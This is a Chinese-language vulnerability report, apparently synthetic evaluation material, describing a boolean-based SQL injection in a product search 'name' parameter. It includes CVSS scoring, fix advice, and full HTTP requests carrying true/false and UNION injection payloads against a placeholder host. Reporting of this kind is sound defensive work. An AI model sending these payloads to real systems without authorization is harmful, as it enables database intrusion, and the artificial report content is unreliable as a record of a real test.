# 示例系统-商品搜索 name 参数 SQL 注入：真假条件改变查询结果

CVSS 4.0：CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N  评分 5.3（中危）

## 描述
普通用户搜索 `alpha` 返回一条商品。在 `name` 参数后追加真假 SQL 条件，真条件返回一条、假条件返回零条；两组请求各重复一次，结果相同。UNION 请求返回 400，未取得其他数据。

## 修复建议
将 `name` 输入作为参数化查询的普通值处理。修复后 SQL 片段不应改变查询逻辑；源码和数据库版本未核实。

## 测试过程
测试时间：2026-11-01 10:00:00（北京时间）
执行工具：未记录。本次结果来自离线合成报文，未在 Burp Repeater 中复测。建议复测时使用授权账号捕获真实请求，将正常搜索请求放入 Repeater，只修改 `name` 为真、假条件，分别重复发送并比较 `items` 和 `total`。UNION 请求返回 400，未取得额外结果。数据库版本、表结构、其他数据读取、写入和命令执行未验证。

## 攻击链路
```text
普通用户提交商品搜索关键词
└─ 修改 name 参数中的查询条件
   └─ GET /api/products
      └─ 真条件返回 1 条，假条件返回 0 条
```

## 证据说明
来源为离线合成报文，没有访问真实服务。完整请求与响应按用途附在下方。

**完整请求与响应**

**正常搜索**

请求：

```http
GET /api/products?name=alpha HTTP/1.1
Host: report-eval.invalid
X-Eval-Actor: user-a
Content-Length: 0


```

响应：

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 55

{"items":[{"id":"product-a","name":"alpha"}],"total":1}
```

**真条件搜索**

请求：

```http
GET /api/products?name=alpha%27%20AND%201%3D1--%20 HTTP/1.1
Host: report-eval.invalid
X-Eval-Actor: user-a
Content-Length: 0


```

响应：

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 55

{"items":[{"id":"product-a","name":"alpha"}],"total":1}
```

**假条件搜索**

请求：

```http
GET /api/products?name=alpha%27%20AND%201%3D2--%20 HTTP/1.1
Host: report-eval.invalid
X-Eval-Actor: user-a
Content-Length: 0


```

响应：

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 22

{"items":[],"total":0}
```

**再次发送真条件搜索**

请求：

```http
GET /api/products?name=alpha%27%20AND%201%3D1--%20 HTTP/1.1
Host: report-eval.invalid
X-Eval-Actor: user-a
Content-Length: 0


```

响应：

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 55

{"items":[{"id":"product-a","name":"alpha"}],"total":1}
```

**再次发送假条件搜索**

请求：

```http
GET /api/products?name=alpha%27%20AND%201%3D2--%20 HTTP/1.1
Host: report-eval.invalid
X-Eval-Actor: user-a
Content-Length: 0


```

响应：

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 22

{"items":[],"total":0}
```

**UNION 方式搜索**

请求：

```http
GET /api/products?name=alpha%27%20UNION%20SELECT%20NULL--%20 HTTP/1.1
Host: report-eval.invalid
X-Eval-Actor: user-a
Content-Length: 0


```

响应：

```http
HTTP/1.1 400 Bad Request
Content-Type: application/json
Content-Length: 26

{"error":"query_rejected"}
```
